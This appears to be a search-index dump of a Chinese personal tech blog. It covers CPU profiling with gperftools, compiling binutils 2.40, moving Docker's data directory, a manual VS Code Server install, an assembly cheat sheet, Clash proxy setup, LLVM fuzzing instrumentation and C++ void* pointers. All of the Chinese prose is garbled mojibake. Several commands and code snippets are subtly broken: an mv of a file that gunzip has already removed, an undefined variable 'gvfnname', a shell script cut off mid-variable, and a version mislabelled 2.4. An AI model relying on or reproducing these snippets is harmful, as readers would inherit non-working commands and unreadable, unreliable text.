ä¸­é—´ç»“æŸæ—¶ å†æ¬¡kill -12 $PID è·å¾— test.prof.0.... n 2.2 Also you can use killall command to send the -12 signal killall -12 /path/to/bin 3. Leave the program until the point you want to profile it, then run again: killall -12 /path/to/bin You will notice the following output when the output file was correctly generated: Using signal 12 as cpu profiling switch PROFILE: interrupts/evictions/bytes = 4773/1826/231936 4. Once the application ended the test.prof.0 file contains the CPU profile information. To get a graphical output run: google-pprof -gv ./path/to/bin test.prof 3.ç”Ÿæˆè¿è¡Œæ—¶é—´å›¾ å¦‚æœå‡ºç°: DWARF error: invalid or unhandled FORM value: 0x25 å‚è€ƒ: Ubuntu ç¼–è¯‘å®‰è£… Binutils2.4ç‰ˆæœ¬ # ç”Ÿæˆå›¾ç‰‡ï¼Œ ç»ˆç«¯æ— æ³•é¢„è§ˆ google-pprof --gv ./path/to/bin test.prof # ç”Ÿæˆhtmlé¢„è§ˆï¼Œ ç»ˆç«¯æ— æ³•é¢„è§ˆ google-pprof --web ./path/to/bin test.prof # ç”Ÿæˆpdfï¼Œ ç”Ÿæˆåéœ€è¦ä¸‹è½½æŸ¥çœ‹ google-pprof --pdf ./path/to/bin test.prof > output.pdf 1ä¸ªå•ä½ å¤§çº¦10msï¼Œ æ‰€ä»¥ 118 ~= 1.18s æµ‹è¯•è„šæœ¬ gnu gprofgoogle gprofgprof2dot_path=\"path to gprof2dot\" #$1: Tested program (path of binary file) #$2: Total execution time of tested program # gprof ç‰ˆæœ¬ä¸º2.34 ä¸æ”¯æŒ DWARFV5 # æŠ¥é”™ï¼š BFD: DWARF error: invalid or unhandled FORM value: 0x25 #gprof $1 > $1.log # ä½¿ç”¨resources/binutils24lib/bin/gprof ï¼Œ2.40ç‰ˆæœ¬å¯æ”¯æŒ DWARFV5 # å·²æå‰ ln -s &lt;path/to/resources/binutils24lib/bin/gprof> /usr/bin/gprof24 gprof24 $1 > $1.log python3 $&#123;gprof2dot_path&#125;/gprof2dot.py -t $2 $1.log | dot -Tpng -o $1.pngtarget_openssl_path=path to binary file id=$1 google-pprof --pdf $&#123;target_openssl_path&#125;/exe test.prof.$&#123;id&#125; > test.prof_$&#123;id&#125;.pdf","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"C++","slug":"æŠ€æœ¯å‘/C","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/C/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://www.sizaif.com/tags/C/"},{"name":"æ€§èƒ½æµ‹è¯•","slug":"æ€§èƒ½æµ‹è¯•","permalink":"https://www.sizaif.com/tags/%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"}],"author":"sizaif"},{"title":"Linux ç¼–è¯‘Binutils2.4","slug":"linux-ç¼–è¯‘Binutils2-4","date":"2023-04-13T09:14:47.000Z","updated":"2023-12-08T03:13:25.000Z","comments":true,"path":"posts/1b7755b0/","link":"","permalink":"https://www.sizaif.com/posts/1b7755b0/","excerpt":"","text":"Ubuntu ç¼–è¯‘å®‰è£… Binutils2.4ç‰ˆæœ¬ é»˜è®¤çš„Binutilsç‰ˆæœ¬ä¸º binutils: Installed: 2.34-6ubuntu1.4 Candidate: 2.34-6ubuntu1.4 Version table: *** 2.34-6ubuntu1.4 500 500 http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal-updates/main amd64 Packages 500 http://security.ubuntu.com/ubuntu focal-security/main amd64 Packages 100 /var/lib/dpkg/status 2.34-6ubuntu1 500 500 http://mirrors.tuna.tsinghua.edu.cn/ubuntu focal/main amd64 Package é»˜è®¤çš„2.34 åŒ…å«çš„ Objdump,gprof,BDF ,lld,ç­‰æ˜¯ä¸å…¼å®¹æœ€æ–°çš„DWARF-V5çš„ è€ŒClang-14 -g ç”Ÿæˆçš„ç¼–è¯‘ä¿¡æ¯æ˜¯ä»¥DWARF-V5 æœ€æ–°ç‰ˆæœ¬ä¸ºåŸºç¡€çš„ï¼Œ æ‰€ä»¥å°±ä¼šå‡ºç°å¦‚ä¸‹é”™è¯¯ï¼š DWARF error: invalid or unhandled FORM value: 0x25 å›°æ‰°è®¸ä¹… ä¸€ç§è§£å†³æ–¹å¼æ˜¯clang++ ç­‰æœ€æ–°ç¼–è¯‘å™¨ç¼–è¯‘æ—¶æ·»åŠ  -gdwarf-4 å‚æ•°ä½¿å…¶ä½¿ç”¨DWARFV4ç‰ˆæœ¬ã€‚ ä½†è¿™ç§æ–¹æ³•æœ‰äº‹å¹¶ä¸å¯è¡Œ â€‹ ASAN æ£€æµ‹å†…å­˜é”™è¯¯ debug ç´¢æ€§å°±å®‰è£…æœ€æ–°çš„ç‰ˆæœ¬å§ï¼ Binutils2.4 æ˜¯æ”¯æŒ DWARF-V5çš„ æˆ–è€…ç›´æ¥ä¸‹è½½æˆ‘å·²ç¼–è¯‘å¥½çš„ï¼š æå–ç : 5zo2 å»ºè®®ä¸€ä¸‹å‘½ä»¤ä½¿ç”¨å¸¦æœ‰ç®¡ç†å‘˜ç”¨æˆ·æ‰§è¡Œï¼Œè‹¥æ²¡æœ‰æƒé™ï¼Œåˆ™åœ¨å‘½ä»¤å‰åŠ sudo ä¸‹è½½æºç ï¼š wget https://ftp.gnu.org/gnu/binutils/binutils-2.40.tar.gz è§£å‹ç¼–è¯‘ tar -zxvf XXXX cd XXXX ./Configure --prefix=`pwd`/build-install make make install å¦‚æœConfigureæ—¶æç¤º ç¼ºå°‘GMP4.2+,MPFR3,1,0+ ä¹‹ç±»çš„ä¾èµ–çš„è¯ wget ftp://gcc.gnu.org/pub/gcc/infrastructure/gmp-6.1.0.tar.bz2 wget ftp://gcc.gnu.org/pub/gcc/infrastructure/mpfr-3.1.4.tar.bz2 wget ftp://gcc.gnu.org/pub/gcc/infrastructure/mpc-1.0.3.tar.gz åˆ†åˆ«è§£å‹ è¿›å…¥å¯¹åº”ç›®å½• tar -jxvf XXX cd XXX ./Configure make &amp;&amp; make install WARNING: `makeinfoâ€™ is missing on your system. You should only need it if ä¹‹ç±»çš„é”™è¯¯ å®‰è£…ï¼š apt-get install texinfo apt-get install flex apt-get install bison å¦‚æœå‡ºç° fatal error: sys/cdefs.h: No such file or directory åœ¨64ä½çš„Ubuntuå¦‚æœæ‰§è¡ŒX86å¹³å°32ä½ç¼–è¯‘ï¼Œgcc -m32 -o x x.cä¼šæŠ¥é”™ï¼šfatal error: sys/cdefs.h: No such file or directoryapt-get install libc6-dev-i386 apt-get install libc6-dev-i386 ä¸Šè¿°é—®é¢˜éƒ½è§£å†³åï¼Œ å»ºè®®åˆ é™¤æ‰å½“å‰ç›®å½•ï¼Œ é‡æ–°è§£å‹Binutilsï¼Œ é‡æ–°æ‰§è¡Œ: tar -zxvf XXXX cd XXXX ./Configure --prefix=`pwd`/build-install make make install æ‰§è¡Œå®Œæˆå ï¼Œ ä¼šåœ¨å½“å‰ç›®å½•ä¸‹çš„/build-install/binç›®å½•ä¸­å‡ºç°æ–°å®‰è£…çš„gprof,objdump,lld ç­‰ ä½¿ç”¨é“¾æ¥å‘½ä»¤è¿›è¡Œè¿æ¥ #ä¾‹å¦‚: ln -s `pwd`/bin/gprof /usr/bin/gprof24","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Linux","slug":"æŠ€æœ¯å‘/Linux","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.sizaif.com/tags/Linux/"},{"name":"Binutils","slug":"Binutils","permalink":"https://www.sizaif.com/tags/Binutils/"}],"author":"sizaif"},{"title":"Linuxä¸‹ä»ç³»ç»Ÿè·¯å¾„ä¸‹è¿ç§»dockerå®¹å™¨ä¸é•œåƒ","slug":"linuxä¸‹ä»ç³»ç»Ÿè·¯å¾„ä¸‹è¿ç§»dockerå®¹å™¨ä¸é•œåƒ","date":"2023-04-12T00:55:11.278Z","updated":"2023-04-13T04:10:34.000Z","comments":true,"path":"posts/eae714ed/","link":"","permalink":"https://www.sizaif.com/posts/eae714ed/","excerpt":"","text":"ä»ç³»ç»Ÿè·¯å¾„ä¸‹è¿ç§»dockerå®¹å™¨å’Œé•œåƒ sudo systemctl stop docker# å…ˆåœæ­¢docker sudo mkdir docker_data #è·¯å¾„æ˜¯ /home/jq/docker_data sudo rsync -aP /var/lib/docker /home/jq/docker_data # rsyncæ˜¯å¤åˆ¶æ•°æ®ï¼Œä½œç”¨å’Œcpç›¸åŒ sudo mv /var/lib/docker /var/lib/docker.bak #åŸæ¥æ•°æ®åšå¤‡ä»½ sudo ln -s /home/jq/docker_data/docker /var/lib/docker #è½¯è¿æ¥ sudo systemctl daemon-reload #é‡æ–°åŠ è½½é…ç½® sudo systemctl restart docker #é‡æ–°å¯åŠ¨docker","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Docker","slug":"æŠ€æœ¯å‘/Docker","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Docker/"}],"tags":[{"name":"docker","slug":"docker","permalink":"https://www.sizaif.com/tags/docker/"}],"author":"sizaif"},{"title":"Vscodeé’ˆå¯¹dockeræ‰‹åŠ¨å®‰è£…vscode Server","slug":"vscodeé’ˆå¯¹dockeræ‰‹åŠ¨å®‰è£…vscode-server","date":"2023-03-21T01:13:33.000Z","updated":"2023-12-08T03:13:24.000Z","comments":true,"path":"posts/606d0466/","link":"","permalink":"https://www.sizaif.com/posts/606d0466/","excerpt":"","text":"vscodeé’ˆå¯¹dockeræ‰‹åŠ¨å®‰è£…vscode server å½“vscodeç‰ˆæœ¬æ›´æ–°åï¼Œ éœ€è¦é‡æ–°å®‰è£…vscode serverï¼Œ ç”±äºä¼—æ‰€å‘¨çŸ¥çš„åŸå› ï¼Œç»å¸¸ä¸‹è½½ä¸ä¸‹æ¥ï¼Œæ‰€ä»¥é‡‡ç”¨æ‰‹åŠ¨å®‰è£…çš„æ–¹å¼ step1. è¿›å…¥å®¹å™¨å†…éƒ¨ $ docker exec -it &lt;containerid> /bin/bash $ cd ~/.vscode-server/bin step2. è·å¾—vscode ç‰ˆæœ¬ä¿¡æ¯ $&#123;commit_id&#125; = ee2b180d582a7f601fa6ecfdad8d9fd269ab1884 å¸®åŠ©-&gt;help ç‰ˆæœ¬: 1.76.2 (user setup) æäº¤: ee2b180d582a7f601fa6ecfdad8d9fd269ab1884 æ—¥æœŸ: 2023-03-14T17:55:54.936Z Electron: 19.1.11 Chromium: 102.0.5005.196 Node.js: 16.14.2 V8: 10.2.154.26-electron.0 OS: Windows_NT x64 10.0.22621 æ²™ç›’åŒ–: No step3. æ‰‹åŠ¨ä¸‹è½½ $ wget https://vscode.cdn.azure.cn/stable/$&#123;commit_id&#125;/vscode-server-linux-x64.tar.gz $ tar -zxvf vscode-server-linux-x64.tar.gz $ mv vscode-server-linux-x64 $&#123;commit_id&#125; è‡³æ­¤é‡æ–°å¯åŠ¨vscode è¿æ¥å®¹å™¨ è„šæœ¬è‡ªåŠ¨åŒ–æ‰§è¡Œï¼š #bin/bash commit_id=$1 wget https://vscode.cdn.azure.cn/stable/$&#123;commit_id&#125;/vscode-server-linux-x64.tar.gz tar -zxvf vscode-server-linux-x64.tar.gz mv vscode-server-linux-x64 $&#123;commit_id ä¿å­˜è‡³åŒç›®å½•ä¸‹ï¼Œ chmod +x ï¼Œ ç„¶åè¿è¡Œå³å¯","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Linux","slug":"æŠ€æœ¯å‘/Linux","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Linux/"}],"tags":[{"name":"vscode","slug":"vscode","permalink":"https://www.sizaif.com/tags/vscode/"}],"author":"sizaif"},{"title":"å¸¸ç”¨æ±‡ç¼–ä»£ç æ€»ç»“","slug":"å¸¸ç”¨æ±‡ç¼–ä»£ç æ€»ç»“","date":"2023-02-28T08:25:42.000Z","updated":"2023-03-16T05:47:17.000Z","comments":true,"path":"posts/5ce1dce5/","link":"","permalink":"https://www.sizaif.com/posts/5ce1dce5/","excerpt":"","text":"cmp a,b // æ¯”è¾ƒaä¸b mov a,b // æŠŠbå€¼é€ç»™aå€¼ï¼Œä½¿a=b ret // è¿”å›ä¸»ç¨‹åº nop // æ— ä½œç”¨ï¼Œè‹±æ–‡ï¼ˆno operationï¼‰ç®€å†™ï¼Œæ„æ€â€œdo nothingâ€ï¼ˆæœºå™¨ç 90ï¼‰ call // è°ƒç”¨å­ç¨‹åºï¼Œå­ç¨‹åºä»¥retç»“å°¾ je æˆ–jz // ç›¸ç­‰åˆ™è·³ï¼ˆæœºå™¨ç æ˜¯74æˆ–84ï¼‰ jne æˆ–jnz // ä¸ç›¸ç­‰åˆ™è·³ï¼ˆæœºå™¨ç æ˜¯75æˆ–85ï¼‰ jmp // æ— æ¡ä»¶è·³ï¼ˆæœºå™¨ç æ˜¯EBï¼‰ jb // è‹¥å°äºåˆ™è·³ ja // è‹¥å¤§äºåˆ™è·³ jg // è‹¥å¤§äºåˆ™è·³ jge // è‹¥å¤§äºç­‰äºåˆ™è·³ jl // è‹¥å°äºåˆ™è·³ pop xxx // xxxå‡ºæ ˆ push xxx // xxxå‹æ ˆ","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Linux","slug":"æŠ€æœ¯å‘/Linux","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Linux/"}],"tags":[{"name":"æ±‡ç¼–","slug":"æ±‡ç¼–","permalink":"https://www.sizaif.com/tags/%E6%B1%87%E7%BC%96/"},{"name":"äºŒè¿›åˆ¶","slug":"äºŒè¿›åˆ¶","permalink":"https://www.sizaif.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"}],"author":"sizaif"},{"title":"Linuxä¸Šé…ç½®Clashä»£ç†","slug":"Linuxä¸Šé…ç½®Clashä»£ç†","date":"2023-02-17T08:38:36.000Z","updated":"2023-12-08T03:13:25.000Z","comments":true,"path":"posts/47973370/","link":"","permalink":"https://www.sizaif.com/posts/47973370/","excerpt":"","text":"åœ¨linuxä¸Šé…ç½®Clashä»£ç† Clash for linux githubåœ°å€ï¼š https://github.com/Dreamacro/clash/releases ä¸‹è½½è½¯ä»¶åŒ… ç›´æ¥æ‰“å¼€è¿æ¥å¹¶ä¸‹è½½å¯¹åº”çš„ç‰ˆæœ¬clash-linux-amd64-XXX.gz) æˆ–è€…åœ¨ç»ˆç«¯ä¸Šç”¨wgetä¸‹è½½ $ cd &amp;&amp; mkdir clash $ cd &amp;&amp; cd clash wget -N --no-check-certificate https://github.com/Dreamacro/clash/releases/download/v1.13.0/clash-linux-amd64-v3-v1.13.0.gz gunzip clash-linux-amd64-v3-v1.13.0.gz mv clash-linux-amd64-v3-v1.13.0.gz clash chmod +x clash æ ¹æ®ä»£ç†æä¾›å•†æä¾›çš„è®¢é˜…é“¾æ¥ä¸‹è½½ä»£ç†é…ç½®æ–‡ä»¶ https://XXXXX æ˜¯è®¢é˜…é“¾æ¥ $ wget -O config.yaml https://XXXXX å¯åŠ¨Clash ./clash -d . é…ç½®Clash æµè§ˆå™¨è®¿é—®http://clash.razord.top/#/proxies è¿›è¡Œé…ç½® è®¾ç½®socks5 æˆ–https/httpç«¯å£ ç»ˆç«¯é…ç½®ä»£ç†ä½¿å…¶ç”Ÿæ•ˆ XXXä¸ºä¸Šä¸€æ­¥è®¾ç½®çš„ç«¯å£ socks5ä¸ºè®¾ç½®çš„socks5ä»£ç†é€šé“ï¼Œ å¦‚æœä¸ºhttpåˆ™å¯¹åº”çš„ä¿®æ”¹å³å¯ $ export all_proxy=socks5://127.0.0.1:XXXX","categories":[{"name":"æŠ€æœ¯å‘","slug":"æŠ€æœ¯å‘","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/"},{"name":"Linux","slug":"æŠ€æœ¯å‘/Linux","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Linux/"},{"name":"Clash","slug":"æŠ€æœ¯å‘/Clash","permalink":"https://www.sizaif.com/navigation/categories/%E6%8A%80%E6%9C%AF%E5%90%91/Clash/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://www.sizaif.com/tags/linux/"},{"name":"Clash","slug":"Clash","permalink":"https://www.sizaif.com/tags/Clash/"}],"author":"sizaif"},{"title":"Llvm åˆ›å»ºå¤–éƒ¨è°ƒç”¨å‡½æ•°æ–¹æ³•","slug":"llvm-åˆ›å»ºå¤–éƒ¨è°ƒç”¨å‡½æ•°æ–¹æ³•","date":"2023-02-12T08:25:43.000Z","updated":"2023-03-16T05:47:16.000Z","comments":true,"path":"posts/dbb96a4a/","link":"","permalink":"https://www.sizaif.com/posts/dbb96a4a/","excerpt":"","text":"llvm åˆ›å»ºå¤–éƒ¨è°ƒç”¨å‡½æ•°æ–¹æ³• 2023-02-12 15:26:19 sizaif [TOC] æ³•ä¸€: å£°åå‚æ•°ç±»å‹åŠå‡½æ•°ç±»å‹ // Fun Ty static FunctionType *_EntryStackFnTy; static FunctionType *_TaintHandleTy; // Fn static Function *_EntryStackFn; static Function *_TaintFn; _TaintHandleTy = FunctionType::get(VoidTy, &#123;Int32Ty, Int32Ty, Int32Ty&#125;, true); // trueå¯å˜å‚æ•° _EntryStackFnTy = FunctionType::get(VoidTy, &#123;Int8PtrTy,Int64Ty&#125;, false); ç¬¬ä¸‰ä¸ªå‚æ•°falseï¼Œè¡¨ç¤ºæ­¤å‡½æ•°ä¸æ˜¯å¯å˜å‚æ•°, è‹¥ä¸ºtrue åˆ™è¡¨æ˜å‡½æ•°æ˜¯å¯å˜å‚æ•° åœ¨llvm IRä¸­å¤„ç†å¹¶è°ƒç”¨å‡½æ•°: map&lt;StringRef ,GlobalVariable *> fnname2gv; IRBuilder&lt;> *builder; .... void handle(Module *mod)&#123; builder = new IRBuilder&lt;>(mod->getContext()); // å£°æ˜builder Int32Ty = IntegerType::getInt32Ty(mod->getContext()); std::vector&lt;Value*>vec_arg; StringRef fn_name = func->getName(); u64 fn_name_hash = hash64_char(fn_name.str().c_str(), fn_name.size()); // hash(fn_name) if(!fnname2gv.count(fn_name))&#123; ArrayType *ty = ArrayType::get(Type::getInt8Ty(mod->getContext()), fn_name.size() + 1); GlobalVariable *gv = new GlobalVariable( *mod, ty, true, GlobalValue::InternalLinkage, nullptr, (funcCount > 0 ? \".funcName.\" + to_string(funcCount) : \".funcName\")); ++funcCount; gv->setAlignment(MaybeAlign(1)); Constant *arrayValue = ConstantDataArray::getString(mod->getContext(), fn_name, true); gv->setInitializer(arrayValue); fnname2gv[fn_name] = gvfnname; &#125; vector&lt;Constant *> indices; indices.push_back(ConstantInt::get(Int64Ty, 0)); indices.push_back(ConstantInt::get(Int64Ty, 0)); vec_arg.push_back(ConstantExpr::getGetElementPtr(fnname2gv[fn_name]->getValueType(),fnname2gv[fn_name],indices)); vec_arg.push_back(ConstantInt::get(Int64Ty,fn_name_hash)); builder->SetInsertPoint(inst); builder->CreateCall(_EntryStackFn,vec_arg); &#125; 1.å¯¹äºå­—ç¬¦ä¸²ç±»å‹ï¼Œæ— æ³•ç›´æ¥å°†string è½¬æ¢æˆValue*, ä½†GlobalString æ˜¯Valueç±»å‹ï¼Œ æ‰€ä»¥é€šè¿‡æ„å»ºå…¨å±€å˜é‡çš„å½¢å¼ï¼š string-&gt;StringRef-&gt;globalString-&gt;Value* åœ¨llvm IRä¸­ä¼ é€’å‚æ•°åº”ä½¿ç”¨Value* ``` 2.å¯¹äºå¯å˜å‚æ•°å˜é‡ åªéœ€è¦å…ˆå¡«å……`counts` ï¼ˆå‘ŠçŸ¥åé¢æœ‰å‡ ä¸ªå‚æ•°,è¿™ä¸ª`counts`æ˜¯ä¸åŒ…å«åœ¨å¯å˜å‚æ•°é‡Œï¼Œéœ€è¦æ˜¾å¼å£°æ˜çš„) ; ç„¶åå¾€`vector`é‡Œå¡«å……å³å¯ ä¾‹å¦‚ï¼š ```cpp std:vector&lt;Value*>vec_arg; vec_arg.push_back(ConstantInt::get(Int32Ty,2)); // counts vec_arg.push_back(ConstantInt::get(Int32Ty,10000)); vec_arg.push_back(fnname2gv[fn_name]); å¤–éƒ¨å‡½æ•°ï¼š extern \"C\" void entrystackFunc(char *funcName, u64 fnamehash)&#123; ..... &#125; extern \"C\" void _Taint_handle(int inst_type, int isOrNo, int counts, ...)&#123; va_list args; va_start(args, counts); for (int idx = 0; idx &lt; counts; idx++) &#123; auto temps_va = va_arg(args, void *); // void * ç±»å‹æ¥æ”¶ u64 tmp = (u64)(temps_va); // è½¬æ¢åˆ°å¯¹åº”çš„ç±»å‹ &#125; va_end(args); &#125; æ³•äºŒ å£°æ˜å‡½æ•° string entryFuncName(\"entryFunc\"); Function *insertentryFuncDecl(Module *mod) &#123; Int64Ty = IntegerType::getInt64Ty(mod->getContext()); FunctionCallee c = mod->getOrInsertFunction(entryFuncName, FunctionType::getVoidTy(mod->getContext()), Type::getInt8PtrTy(mod->getContext()), Int64Ty); return static_cast&lt;Function *>(c.getCallee()); &#125; åœ¨llvm IRä¸­å¤„ç†å¹¶å‡½æ•°è°ƒç”¨ Function *entryFunc = insertentryFuncDecl(mod); std::vector&lt;Value *> Args; .... Args.push_back(...) .... Instruction *entryCall = CallInst::Create( entryFunc->getFunctionType(), entryFunc, Args); entryCall->insertBefore(inst); å¤–éƒ¨å‡½æ•° å¤–éƒ¨å‡½æ•°åŒæ³•ä¸€ä¸­æ‰€æŒ‡","categories":[{"name":"Master","slug":"Master","permalink":"https://www.sizaif.com/navigation/categories/Master/"},{"name":"LLVM","slug":"Master/LLVM","permalink":"https://www.sizaif.com/navigation/categories/Master/LLVM/"}],"tags":[{"name":"fuzzing","slug":"fuzzing","permalink":"https://www.sizaif.com/tags/fuzzing/"},{"name":"LLVM","slug":"LLVM","permalink":"https://www.sizaif.com/tags/LLVM/"}],"author":"sizaif"},{"title":"C/C++ Void*çš„ç†è§£","slug":"C-C-void-çš„ç†è§£","date":"2022-11-07T02:13:38.000Z","updated":"2023-03-16T05:47:29.000Z","comments":true,"path":"posts/820cea1e/","link":"","permalink":"https://www.sizaif.com/posts/820cea1e/","excerpt":"","text":"C/C++ä¸­Void *çš„ç†è§£ 2022-11-06 16:44:35 éƒ¨åˆ†å†…å®¹æ¥è‡ª C++ä¸­çš„void*ç†è§£ 1. void *æ˜¯ä»€ä¹ˆï¼Ÿ è¯­è¨€ä¸­ï¼Œ*ç±»å‹å°±æ˜¯æŒ‡é’ˆç±»å‹ã€‚æ¯”å¦‚ int *pï¼Œdouble qï¼Œè™½ç„¶æ˜¯ä¸ä¸€æ ·çš„æŒ‡é’ˆï¼Œä½†æ˜¯å¤§å°å´ä¸€æ ·sizeofÂ§ == sizeof(q)ï¼Œå…¶å®å¾ˆå®¹æ˜“ç†è§£ï¼Œå› ä¸ºä»–ä»¬éƒ½æ˜¯åŒä¸€ç§ç±»å‹ç±»å‹çš„ã€‚Cè¯­è¨€æ˜¯å¼ºç±»å‹çš„è¯­è¨€ã€‚å¯¹ç±»å‹çš„åŒºåˆ†ååˆ†ä¸¥æ ¼ã€‚é‚£è¿™ä¸¤ä¸ªæœ‰ä»€ä¹ˆä¸åŒç‚¹å—ï¼Ÿæœ‰ï¼Œ+1å°±ä¸åŒäº†ï¼Œå¦‚ä¸‹ï¼š ä¹Ÿå°±æ˜¯å¯¹äºä¸€ä¸ªæŒ‡é’ˆè€Œè¨€ï¼Œå¦‚æœæˆ‘ä»¬åœ¨å‰é¢è§„å®šäº†å®ƒçš„ç±»å‹ã€‚é‚£å°±ç›¸å½“äºå†³å®šäº†å®ƒçš„â€œè·³è·ƒåŠ›â€ã€‚â€œè·³è·ƒåŠ›â€å°±æ¯”å¦‚è¯´ä¸Šé¢å›¾ä¸­intè·³äº†4ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯doubleè·³äº†8ä¸ªå­—èŠ‚ã€‚ åŸºäºè¿™æ ·çš„ç†è§£ï¼Œæˆ‘è¦å¯¹void *ä¸‹å®šä¹‰äº†ï¼švoid * æ˜¯ä¸€ä¸ªè·³è·ƒåŠ›æœªå®šçš„æŒ‡é’ˆ 2. void*è¯¦è§£ 2.1 voidå¯ä»¥æŒ‡å‘ä»»ä½•ç±»å‹çš„åœ°å€ï¼Œä½†æ˜¯å¸¦ç±»å‹çš„æŒ‡é’ˆä¸èƒ½æŒ‡å‘voidçš„åœ°å€ æ­£å¸¸æ¥è¯´å¦‚æœä¸¤ä¸ªæŒ‡é’ˆç±»å‹ä¸ä¸€æ ·çš„è¯ï¼Œä¸¤ä¸ªæŒ‡é’ˆå˜é‡æ˜¯ä¸å¯ä»¥ç›´æ¥ç›¸ç­‰çš„ã€‚ä¾‹å¦‚int* a, float* bï¼Œå‡å¦‚ä»¤a = bï¼Œä¼šç›´æ¥å‘ç”Ÿç¼–è¯‘é”™è¯¯ï¼Œè€ŒvoidæŒ‡é’ˆå¯ä»¥ç­‰äºä»»ä½•ç±»å‹çš„æŒ‡é’ˆã€‚ä½†æ˜¯åè¿‡æ¥ä¸å¯ä»¥ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªæœ‰ç±»å‹çš„æŒ‡é’ˆä¸èƒ½æŒ‡å‘ä¸€ä¸ªvoidç±»å‹çš„å˜é‡ï¼ˆå“ªæ€•æ­¤æ—¶void*å˜é‡å·²ç»æŒ‡å‘äº†ä¸€ä¸ªæœ‰ç±»å‹çš„åœ°å€ï¼‰ã€‚ float f = 5.5; float* pf = &amp;f; void* pv = pf; float* pf2 = pv;//ç¼–è¯‘é”™è¯¯ï¼Œæœ‰ç±»å‹çš„æŒ‡é’ˆå˜é‡ä¸èƒ½æŒ‡å‘void*å˜é‡ 2.2 void*æŒ‡é’ˆåªæœ‰å¼ºåˆ¶ç±»å‹è½¬æ¢ä»¥åæ‰å¯ä»¥æ­£å¸¸å–å€¼ int main(int argc, const char * argv[]) &#123; float f = 5.5; float* pf = &amp;f; void* pv; pv = pf; //è¿™å¥æ˜¯å¯ä»¥çš„ cout&lt;&lt;*pv&lt;&lt;endl; //ç¼–è¯‘é”™è¯¯ï¼Œè¿™æ ·ç›´æ¥å¯¹pvå–å€¼æ˜¯é”™è¯¯çš„ cout&lt;&lt;*(float*)pv&lt;&lt;endl; //å¼ºåˆ¶ç±»å‹è½¬æ¢åå¯ä»¥å–å€¼ return 0; &#125; åœ¨ä»¤pv = pfåï¼Œæ­¤æ—¶pvå’ŒpfæŒ‡å‘çš„æ˜¯åŒä¸€ä¸ªåœ°å€ï¼Œå€¼ç›¸åŒï¼Œä½†æ˜¯ä¸¤è€…çš„ç±»å‹æ˜¯ä¸ä¸€æ ·çš„ã€‚pfä½œä¸ºæµ®ç‚¹å‹æŒ‡é’ˆï¼Œæ˜¯å¯ä»¥ç›´æ¥å–åˆ°æµ®ç‚¹æ•°çš„ï¼Œä½†æ˜¯pvå¿…é¡»è¦å¼ºåˆ¶ç±»å‹è½¬æ¢ä»¥åæ‰å¯ä»¥å–å€¼ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªvoid*çš„æŒ‡é’ˆå¿…é¡»è¦ç»è¿‡å¼ºåˆ¶ç±»å‹è½¬æ¢ä»¥åæ‰æœ‰æ„ä¹‰ã€‚ int main(int argc, const char * argv[]) &#123; float f = 5.5; float* pf = &amp;f; void* pv; pv = pf; cout&lt;&lt;*(float*)pv&lt;&lt;endl; //å¼ºåˆ¶ç±»å‹è½¬æ¢åå¯ä»¥å–å€¼,å€¼ä¸º5.5 cout&lt;&lt;*(int*)pv&lt;&lt;endl; //å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œå€¼ä¸º1085276160 cout&lt;&lt;(int)(*(float*)pv)&lt;&lt;endl;//å–å€¼åå†æ¬¡ç±»å‹è½¬æ¢ï¼Œå€¼ä¸º5 return 0; &#125; å¦‚æœæŠŠä¸€ä¸ªæŒ‡å‘floatçš„å€¼çš„voidæŒ‡é’ˆï¼Œå¼ºåˆ¶è½¬æ¢æˆint*ä¹Ÿæ˜¯ä¸å¯¹çš„ã€‚ä¹Ÿå°±æ˜¯è¯´åœ°å€ä¿å­˜äº†ä»€ä¹ˆæ ·çš„å˜é‡ï¼Œå°±è¦è½¬åŒ–æˆå“ªç§ç±»å‹çš„æŒ‡é’ˆï¼Œå¦åˆ™å°±ä¼šå‡ºé”™ã€‚ 2.3 void*æŒ‡é’ˆå˜é‡å’Œæ™®é€šæŒ‡é’ˆä¸€æ ·å¯ä»¥é€šè¿‡ç­‰äº0æˆ–è€…NULLæ¥åˆå§‹åŒ–ï¼Œè¡¨ç¤ºä¸€ä¸ªç©ºæŒ‡é’ˆ void* pv = 0; void* pv2 = NULL; cout&lt;&lt;pv &lt;&lt;endl; //å€¼ä¸º0x0 cout&lt;&lt;pv2&lt;&lt;endl; //å€¼ä¸º0x0 **2.4 